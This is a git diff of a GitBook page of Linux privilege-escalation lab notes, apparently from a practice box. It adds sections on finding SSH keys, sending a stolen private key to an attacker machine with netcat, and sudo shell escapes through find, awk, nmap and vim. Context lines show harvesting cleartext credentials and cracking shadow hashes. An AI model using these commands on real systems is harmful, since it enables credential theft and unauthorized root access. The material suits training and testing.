@@ -56,7 +56,7 @@ In command prompt type:&#x20;
 id
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary
 
@@ -69,7 +69,7 @@ cp /tmp/bak /usr/bin/passwd
 ls -lah /usr/bin/passwd 
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation - Stored Passwords (Config Files)
 
@@ -81,7 +81,7 @@ From the output, make note of the value of the “auth-user-pass” directive.&#
 cat /home/user/myvpn.ovpn
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 From the output, make note of the clear-text credentials.&#x20;
 
@@ -91,7 +91,7 @@ From the output, make note of the clear-text credentials.&#x20;
 cat /etc/openvpn/auth.txt 
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From the output, make note of the clear-text credentials.
 
@@ -101,7 +101,7 @@ From the output, make note of the clear-text credentials.
 cat /home/user/.irssi/config | grep -i passw 
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation - Stored Passwords (History)
 
@@ -113,7 +113,7 @@ cat ~/.bash_history | grep -i passw
 
 From the output, make note of the clear-text credentials.
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation - Weak File Permissions
 
@@ -125,7 +125,7 @@ cat /etc/passwd
 
 Save the output to a file on your attacker machine
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -135,7 +135,7 @@ cat /etc/shadow
 
 Save the output to a file on your attacker machine
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -145,4 +145,110 @@ hashcat -m 1800 unshadowed.txt rockyou.txt -O
 ```
 
 <figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation - SSH Keys
+
+Found nothing for this box
+
+**Victim**
+
+```
+find / -name authorized_keys 2> /dev/null
+```
+
+**Victim**
+
+```
+find / -name id_rsa 2> /dev/null
+cat /backups/supersecretkeys/id_rsa
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+
+#### Netcat
+
+**Kali(receiving)**
+
+```
+nc -l -p 1234 > id_rsa
+```
+
+**Victim(sending)**
+
+```
+nc -w 3 $KALI 1234 < id_rsa
+```
+
+**Kali**
+
+```
+chmod 400 id_rsa
+ssh -i id_rsa root@$VICTIM
+```
+
+## Privilege Escalation - Sudo (Shell Escaping)
+
+
+
+**Victim**
+
+```
+ sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Victim**
+
+```
+sudo find /bin -name nano -exec /bin/sh \;
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+sudo awk 'BEGIN {system("/bin/sh")}'
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+sudo vim -c '!sh'
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
